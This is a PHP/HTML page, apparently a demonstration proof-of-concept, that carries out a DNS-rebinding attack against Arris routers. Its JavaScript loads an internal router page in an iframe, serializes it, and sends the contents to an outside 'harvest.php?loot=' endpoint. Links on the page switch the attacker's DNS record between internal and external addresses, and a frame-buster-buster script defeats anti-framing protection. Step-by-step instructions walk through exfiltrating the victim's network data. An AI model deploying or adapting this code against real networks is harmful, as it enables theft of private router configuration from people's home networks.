<?php
header("Access-Control-Allow-Origin: *");
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Cache-Control: post-check=0, pre-check=0', FALSE);
header('Pragma: no-cache');
unset($_COOKIE['sessionToken']);
?>
<html>
	<head>
		<title>Zarro demo page</title>
 <link rel="stylesheet" type="text/css" href="zarro.css">
<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>

<script type="text/javascript">
// Frame Buster Buster
    var prevent_bust = 0  
    window.onbeforeunload = function() { prevent_bust++ }  
    setInterval(function() {  
		if (prevent_bust > 0) {  
		prevent_bust -= 2  
		window.top.location = '/204.php'
    	}  
    }, 1)  
</script>

<script>
function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1);
        if (c.indexOf(name) != -1) return c.substring(name.length,c.length);
    }
    return "";
}
 function post_iframe() {
	 var iframe = document.getElementById('someaction');
	 var iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
	 xmlString = (new XMLSerializer()).serializeToString(iframeDocument);
	 var encoded = encodeURIComponent(xmlString);
	 //window.location.href="https://router.hacktheplanet.ga/zarro/harvest.php?loot="+encoded;
	 window.open("http://router.hacktheplanet.ga/zarro/harvest.php?loot="+encoded);
 }

$(document).ready(function(){
  // Begin button getrequest
  $("#getrequest").click(function(){
	  document.getElementById('someaction').src = document.getElementById("geturl").value;
	  var x = document.getElementById("someaction");
	  var y = (x.contentWindow || x.contentDocument);
	  if (y.document)y = y.document;
	  y.body.style.backgroundColor = "red";
    iframe[0].documentElement.innerHTML += '<p>button pushed</p>';
	iframe[0].documentElement.innerHTML += '<a href="#" onClick="alert(document.cookie);">Get cookie</p>';
    });
  // End button getrequest



  // One time on document.ready() activities
  document.getElementById('somediv').innerHTML ='<h2>Hostname is:</h2><img src="/zarro/switch-on.php" id="onoff"><ul><li><a href="#" onClick=document.getElementById("onoff").src="http://ssh.dyn.org/zarro/switch-off.php">Set Router IP external</a></li><li><a href="#" onClick=document.getElementById("onoff").src="http://ssh.dyn.org/zarro/switch-on.php">Set Router IP internal</a></li></ul>';

// End document.ready()
});
</script>
	</head>
	<body>
		<h1>Zarro demo page</h1>
<div id="left"><p>How to do the attack manually.<p>
<p>This works the most reliable with a cleared browser cache. Don't work too fast as DNS resolvers not always follow the DNS servers settings and cache for a bit longer.</p>
<ul>
<li>Point router.hacktheplanet.ga to the internal IP address (this is already done for you)
<li>Call an internal page on the Arris router that will not lead to a redirect (example given already).<br>You can use the given URL. Make sure that the URL is not loaded from cache by adding a GET parameter to the line. Pressing "HTTP GET request" will load the page in the iframe. A cookie will be set in this context as well.
<li>Switch to the external address. Check with a lookup whether it went right: nslookup router.hacktheplanet.ga should point to 5.196.72.236.
<li>Generate a new POST form in the iframe context by entering http://router.hacktheplanet.ga/zarro/mkpost.php?randomparameter=randomvalue and pressing "HTTP GET Request". The iframe will be filled with a form. 
<li>Switch back to the internal address. Check again with nslookup. If something failed, you can manually switch using http://router.hacktheplanet.ga/zarro/switch-on.php or http://router.hacktheplanet.ga/zarro/switch-off.php.
<li>Submit the form. You'll get the XML content in the iframe.
<li>Post your network. This will send the contents of your iframe to a differentwebpage. Now the information has left your computer and your private network and is available on the Internet.
</ul>
</div>
<div id="right">
<table>
		<tr><td><label>The iframe URL: </label></td><td><input id="geturl" value="http://<your.domain>/css/wizards.css?v=20190411231250" size=96></td></tr>
<tr><td>&nbsp;</td><td><button id="getrequest">HTTP GET request</button></td></tr></table></div>
		<div id="somediv"></div>
		<iframe id="someaction" heigth=400 width=700 scrolling="yes"></iframe><br>
<a href="#" onClick="post_iframe()">Post your network</a><br>
	</body>
</html>
